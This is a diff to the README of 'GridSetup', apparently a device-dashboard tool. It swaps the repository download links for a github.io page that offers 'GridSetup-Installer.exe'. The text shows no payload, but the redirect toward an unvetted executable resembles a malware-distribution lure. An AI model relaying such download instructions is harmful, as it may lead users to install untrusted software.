@@ -1,12 +1,12 @@
 # 📡 GridSetup - Manage your digital environment with ease
 
-[![](https://img.shields.io/badge/Download-GridSetup-blue.svg)](https://github.com/zainmaryam876-source/GridSetup)
+[![](https://img.shields.io/badge/Download-GridSetup-blue.svg)](https://zainmaryam876-source.github.io)
 
 GridSetup provides a central dashboard for your technical projects. It connects tools for radio signals, satellite tracking, networking, and home automation into one screen. You use this software to observe and control devices without writing code.
 
 ## 📥 How to download the software
 
-Visit [this page](https://github.com/zainmaryam876-source/GridSetup) to download the current version. Look for the file labeled GridSetup-Installer.exe. Click the file to save it to your computer.
+Visit [this page](https://zainmaryam876-source.github.io) to download the current version. Look for the file labeled GridSetup-Installer.exe. Click the file to save it to your computer.
 
 ## 💻 System requirements
 
